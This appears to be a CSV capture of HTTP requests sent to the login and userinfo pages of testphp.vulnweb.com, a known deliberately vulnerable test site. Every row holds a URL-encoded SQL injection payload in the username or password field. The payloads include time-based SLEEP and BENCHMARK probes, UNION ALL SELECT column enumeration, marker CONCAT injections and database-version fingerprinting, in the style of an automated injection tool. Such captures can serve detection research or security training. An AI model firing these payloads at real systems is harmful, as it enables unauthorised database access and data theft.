url,method,body,Content-Length,Host,Cache-Control,Origin,Content-Type,Upgrade-Insecure-Requests,User-Agent,Accept,Sec-GPC,Accept-Language,Referer,Accept-Encoding,Connection,Cookie
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=%28SELECT%20CONCAT%280x7170766a71%2C%28ELT%281160%3D1160%2C1%29%29%2C0x716a6b7671%29%29,105,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=%28SELECT%20CONCAT%280x7170766a71%2C%28ELT%281160%3D1160%2C1%29%29%2C0x716a6b7671%29%29,105,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3BSELECT%20SLEEP%285%29%23,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3BSELECT%20SLEEP%285%29--%20fkEM,61,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29IScu%29%23,96,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29MSeu%29--%20nxIS,102,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x59514a6d%29%29%23,87,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x434e7675%29%29--%20Rztn,93,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%285%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%285%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%280%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%280%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%285%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%27%20AND%20%28SELECT%201429%20FROM%20%28SELECT%28SLEEP%285%29%29%29SaDB%29--%20IGuF,109,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%23,61,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,68,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,75,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,82,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,96,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,103,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,110,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,117,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,124,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,131,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,138,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,145,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,152,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,159,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,166,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,173,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,180,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,187,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,194,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7170766a71%2C0x7975464d62747a427a674742734e616c6449506d4d7467726a596d41477571505568717570507972%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%23,230,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7170766a71%2C0x7975464d62747a427a674742734e616c6449506d4d7467726a596d41477571505568717570507972%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7170766a71%2C0x6d715046726e507365776c4d564843756770646d52717a624c6e7962746f554d50574c4a544e515a%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%23,429,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C%28CASE%20WHEN%20%28VERSION%28%29%20LIKE%200x254d61726961444225%29%20THEN%201%20ELSE%200%20END%29%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&pass=fsdfsdf,245,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,login=%2F
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C%28CASE%20WHEN%20%28VERSION%28%29%20LIKE%200x255469444225%29%20THEN%201%20ELSE%200%20END%29%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&pass=fsdfsdf,239,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,login=qpvjq0qjkvq%2F
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C%28CASE%20WHEN%20%28%40%40VERSION_COMMENT%20LIKE%200x256472697a7a6c6525%29%20THEN%201%20ELSE%200%20END%29%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&pass=fsdfsdf,253,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,login=qpvjq0qjkvq%2F
